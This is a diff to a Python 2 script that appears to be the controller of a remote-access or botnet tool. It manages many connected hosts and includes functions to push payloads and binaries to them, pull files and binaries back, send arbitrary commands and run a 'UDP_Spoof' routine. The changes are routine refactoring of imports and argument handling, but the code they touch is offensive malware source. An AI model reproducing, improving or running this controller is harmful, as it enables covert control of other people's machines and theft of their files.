@@ -1,9 +1,9 @@
 #!/usr/bin/python
 
-import sys
 from socket import socket, AF_INET, SOCK_STREAM
 from thread import start_new_thread
 from threading import Thread
+from sys import exit as sysexit, argv, getsizeof
 from time import sleep
 import tab
 
@@ -79,7 +79,7 @@ def UDP_Spoof(nameSet,cur_host_con,cur_host_id,handler):
         handler.remove_host(cur_host_id)
         return 1
     sleep(0.1)
-    fSize = sys.getsizeof(PAYLOAD)
+    fSize = getsizeof(PAYLOAD)
     fSize = str(fSize)
     res = send_comm(fSize,cur_host_con)
     if res == 1:
@@ -119,7 +119,7 @@ def Make_File(nameSet,cur_host_con,cur_host_id,handler):
             return 3
         command = fileToRead.read()
         fileToRead.close()
-        fSize = sys.getsizeof(command)
+        fSize = getsizeof(command)
         fSize = str(fSize)
         res = send_comm(fSize, cur_host_con)
         if res == 1:
@@ -158,7 +158,7 @@ def Make_Binary(nameSet, cur_host_con, cur_host_id,handler):
             return 3
         command = binToRead.read()
         binToRead.close()
-        bSize = sys.getsizeof(command)
+        bSize = getsizeof(command)
         bSize = str(bSize)
         res = send_comm(bSize,cur_host_con)
         sleep(0.1)
@@ -173,12 +173,14 @@ def Make_Binary(nameSet, cur_host_con, cur_host_id,handler):
         return 0
 
 def Pull_File(nameSet, cur_host_con, cur_host_id, handler):
-    remoteFileName = nameSet[0]
+    try:
+        remoteFileName = nameSet[0]
+    except:
+        print ("Remote file name not provided")
+        return 2
     try:
         localFileName = nameSet[1]
     except:
-        localFileName = remoteFileName
-    if localFileName == '':
         localFileName = remoteFileName
     res = send_comm('sendFile',cur_host_con)
     if res == 1:
@@ -196,10 +198,6 @@ def Pull_File(nameSet, cur_host_con, cur_host_id, handler):
         return 2
     else:
         try:
-            localFileName = command[2]
-        except:
-            localFileName = command[1]
-        try:
             localFile = open(localFileName,'w')
         except:
             print ("Cannot create local file")
@@ -211,21 +209,19 @@ def Pull_File(nameSet, cur_host_con, cur_host_id, handler):
         return 0
 
 def Pull_Binary(nameSet, cur_host_con, cur_host_id, handler):
-    remoteBinName = nameSet[0]
+    try:
+        remoteBinName = nameSet[0]
+    except:
+        print ("Remote binary name not provided")
+        return 2
     try:
         localBinName = nameSet[1]
     except:
         localBinName = remoteBinName
     if localBinName == '':
         localBinName = remoteBinName
-    try:
-        remoteBinName = command[1]
-    except:
-        print ("Remote binary name not provided")
-        return 2
     res = send_comm('sendBinary',cur_host_con)
     if res == 1:
-        print ("Connection closed by client")
         handler.remove_host(cur_host_id)
         return 1
     res = send_comm(remoteBinName,cur_host_con)
@@ -238,10 +234,6 @@ def Pull_Binary(nameSet, cur_host_con, cur_host_id, handler):
         print ("File does not exist or Access Denied")
         return 2
     else:
-        try:
-            localBinName = command[2]
-        except:
-            localBinName = command[1]
         try:
             localBin = open(localBinName,'wb')
         except:
@@ -378,7 +370,7 @@ conn_mul_command_dict = {
 #Start Here!
 make_logo()
 try:
-    max_conns = int(sys.argv[1])
+    max_conns = int(argv[1])
 except:
     max_conns = 5
 
@@ -458,9 +450,7 @@ while True:
                 except KeyError:
                     com_reconst = command
                     command = ''
-                    for part in com_reconst:
-                        command += part + " "
-                        command = command[:len(command)-1]
+                    command = " ".join(com_reconst)
                     res = send_comm(command,cur_host_con)
                     if res == 1:
                         print ("Connection closed by client")
@@ -568,4 +558,4 @@ while True:
                 except KeyError:
                     print ("Command not recognised")
     elif translated == 5: #Exit
-        sys.exit()
+        sysexit()
